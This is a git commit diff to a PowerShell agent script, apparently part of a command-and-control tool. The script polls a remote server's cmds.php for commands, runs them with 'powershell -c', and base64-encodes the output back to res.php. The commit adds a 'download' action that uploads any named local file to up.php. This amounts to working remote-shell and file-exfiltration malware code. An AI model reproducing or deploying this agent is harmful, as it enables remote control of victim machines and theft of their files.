d9a34ca6a1f3374f59c5b7ae70f59dd7b3b1543e
Ug0Security <c.vallicari@gmail.com>
2022-10-13 02:24:17 +0200

    Update client.ps1

--- scripts/agents/client.ps1
+++ scripts/agents/client.ps1
@@ -27,7 +27,6 @@ $hello=(Invoke-WebRequest "$url/res.php?res=$EncHello&id=$id")
 while($true)
 {
 
-
 $Content=(Invoke-WebRequest "$url/cmds.php?id=789&o=W").Content
 
 if ([string]::IsNullOrWhiteSpace($Content))
@@ -40,18 +39,19 @@ $Content= $Content.Split(
     @("`r`n", "`r", "`n"), 
    [StringSplitOptions]::None)
 
-
-
 if ([string]::IsNullOrWhiteSpace($Content))
     {
 		Start-Sleep -Seconds 10
         continue
     }
 
-
 ForEach ($line in $Content)
 {
 	$cmd = Select-String -pattern "$id" -InputObject $line
+	if ([string]::IsNullOrWhiteSpace($cmd))
+        {
+        continue
+        }
 	$act = ($cmd -split ':',3)[1]
 if ($act -eq "run")
     {
@@ -61,15 +61,23 @@ if ($act -eq "run")
 	
         continue
     }
-	
 	$Output = (powershell -c $cmd 2>&1)
 	$EncOutputBytes = [System.Text.Encoding]::UTF8.GetBytes($Output)
         $EncOutput = [System.Convert]::ToBase64String($EncOutputBytes)
-	
        $gimme=(Invoke-WebRequest "$url/res.php?res=$EncOutput&id=$id")
 }  
+if ($act -eq "download")
+{
+$file = ($cmd -split ':',3)[-1]
+	if ([string]::IsNullOrWhiteSpace($file))
+    {
+	
+        continue
+    }
+Invoke-Webrequest -URI "$url/up.php?id=$id" -Method POST -InFile "$file"
 
 }
 
+}
  
 }
